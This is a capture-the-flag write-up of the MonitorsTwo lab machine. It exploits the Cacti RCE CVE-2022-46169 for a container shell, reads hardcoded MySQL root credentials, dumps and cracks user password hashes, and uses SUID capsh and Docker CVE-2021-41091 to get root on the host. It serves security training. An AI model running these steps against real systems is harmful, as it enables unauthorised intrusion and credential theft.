# MonitorsTwo

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 10.129.78.86
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-29 23:41 EDT
Nmap scan report for 10.129.78.86
Host is up (0.16s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
```

Another web-based exploit.&#x20;

### Cacti

When we check the web port, we see that it is running Cacti.

<figure><img src="../../.gitbook/assets/image (1151).png" alt=""><figcaption></figcaption></figure>

The version run is actually vulnerable to one unauthenticated RCE exploit, and there are tons of PoCs online to use.

{% embed url="https://github.com/ariyaadinatha/cacti-cve-2022-46169-exploit" %}

This has to do with the polling of Cacti, and we just need to modify the exploit to point to our own IP address to get a shell.

<figure><img src="../../.gitbook/assets/image (1682).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

We got a shell on the docker, so the next step is to escape it.&#x20;

### MySQL Passwords

Within the `/` directory, we can find a bash script:

```
www-data@50bca5e748b0:/$ ls -la
ls -la
total 84
drwxr-xr-x   1 root root 4096 Mar 21 10:49 .
drwxr-xr-x   1 root root 4096 Mar 21 10:49 ..
-rwxr-xr-x   1 root root    0 Mar 21 10:49 .dockerenv
drwxr-xr-x   1 root root 4096 Mar 22 13:21 bin
drwxr-xr-x   2 root root 4096 Mar 22 13:21 boot
drwxr-xr-x   5 root root  340 Apr 29 22:40 dev
-rw-r--r--   1 root root  648 Jan  5 11:37 entrypoint.sh
```

Here's the content of it:

```bash
#!/bin/bash
set -ex

wait-for-it db:3306 -t 300 -- echo "database is connected"
if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
fi

chown www-data:www-data -R /var/www/html
# first arg is `-f` or `--some-option`
if [ "${1#-}" != "$1" ]; then
        set -- apache2-foreground "$@"
fi

exec "$@"
```

So we have a database password and we can enumerate the database. This docker doesn't have `python`, so we cannot spawn a shell via `pty`. Instead, we have to use the `-e` flag to enumerate the database since we don't have a proper shell.

```
www-data@50bca5e748b0:/var/www/html$ mysql --host=db --user=root --password=root cacti -e "show databases" 
<user=root --password=root cacti -e "show databases"
Database
information_schema
cacti
mysql
performance_schema
sys
```

We can extract the hashed password for the users within the database:

```
www-data@50bca5e748b0:/var/www/html$ mysql --host=db --user=root --password=root cacti -e "select * from user_auth"
admin   $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC
marcus  $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C
```

I ran `john` on the hashes, and managed to crack one of them to get `funkymonkey`.

![](<../../.gitbook/assets/image (3292).png>)

With this and a username, we can `ssh` into the machine as `marcus`. Then, grab the user flag.

### CVE-2021-41091 --> Root Shell

Within the `/var/mail` folder, there's some mail for `marcus`:

{% code overflow="wrap" %}
```
marcus@monitorstwo:/var/mail$ cat marcus 
From: administrator@monitorstwo.htb
To: all@monitorstwo.htb
Subject: Security Bulletin - Three Vulnerabilities to be Aware Of

Dear all,

We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.

CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.

CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.

CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.

We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.

Best regards,

Administrator
CISO
Monitor Two
Security Team
```
{% endcode %}

The first 2 vulnerabilities are not relevant, but the last one was rather interesting.&#x20;

{% embed url="https://nvd.nist.gov/vuln/detail/CVE-2021-41091" %}

In short, it appears that when dockers are created, some of the SUID binaries are carried over. In that case, we can enumerate the SUID binaries on the machine and find these using LinPEAS:

```
[+] SUID - Check easy privesc, exploits and write perms                                                                    
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                              
strace Not Found                                                                                                           
-rwsr-xr-x 1 root root 63K Feb  7  2020 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                                                
-rwsr-xr-x 1 root root 44K Feb  7  2020 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 87K Feb  7  2020 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 52K Feb  7  2020 /usr/bin/chsh
-rwsr-xr-x 1 root root 58K Feb  7  2020 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 31K Oct 14  2020 /sbin/capsh
-rwsr-xr-x 1 root root 35K Jan 20  2022 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 71K Jan 20  2022 /bin/su
-rwsr-xr-x 1 root root 55K Jan 20  2022 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
```

`capsh` has the SUID binary set, which is not the norm. Based on GTFOBins, we can run this command to spawn a root shell:

```
www-data@50bca5e748b0:/var/www/html$ capsh --gid=0 --uid=0 --
capsh --gid=0 --uid=0 --
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

Great! Now we are root on the docker. Now, we can find the mounted point of this docker from the main machine, and we can create a `bash` SUID binary to get a shell.&#x20;

First we need to find the mount point using `df`:

```
marcus@monitorstwo:/var/lib/docker$ df
Filesystem     1K-blocks    Used Available Use% Mounted on
udev             1966928       0   1966928   0% /dev
tmpfs             402608    1232    401376   1% /run
/dev/sda2        7054840 4451424   2513656  64% /
tmpfs            2013040       0   2013040   0% /dev/shm
tmpfs               5120       0      5120   0% /run/lock
tmpfs            2013040       0   2013040   0% /sys/fs/cgroup
overlay          7054840 4451424   2513656  64% /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
shm                65536       0     65536   0% /var/lib/docker/containers/e2378324fced58e8166b82ec842ae45961417b4195aade5113fdc9c6397edc69/mounts/shm
overlay          7054840 4451424   2513656  64% /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
shm                65536       0     65536   0% /var/lib/docker/containers/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e/mounts/shm
```

At`/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged` would bring us to the file system of the docker container. Then, using our root shell on docker, we can just use `chmod u+s /bin/bash` to spawn a SUID binary for the main machine to use.&#x20;

This works because of the CVE allowing for us to create SUID binaries across machines.&#x20;

We can see the SUID `bash` binary here:

<figure><img src="../../.gitbook/assets/image (2933).png" alt=""><figcaption></figcaption></figure>

We can get a root shell easily:

```
marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin$ /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin/bash -p 
bash-5.1# id
uid=1000(marcus) gid=1000(marcus) euid=0(root) groups=1000(marcus)
```

Rooted!
